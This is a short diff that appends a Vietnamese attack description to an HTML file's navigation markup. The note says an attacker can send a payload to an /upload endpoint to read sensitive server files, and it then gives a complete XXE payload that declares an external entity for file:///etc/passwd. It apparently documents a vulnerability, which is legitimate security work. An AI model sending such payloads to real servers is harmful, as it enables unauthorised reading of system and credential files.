@@ -22,3 +22,15 @@
     </div>
   </div>
 </nav>
+
+
+
+-	Cách thức tấn công:
++ Kẻ tấn công có thể gửi payload sau qua endpoint /upload để đọc file nhạy cảm trên server:
+<?xml version="1.0"?>
+ <!DOCTYPE root [ 
+        <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+ <root> 
+&xxe;
+ </root>
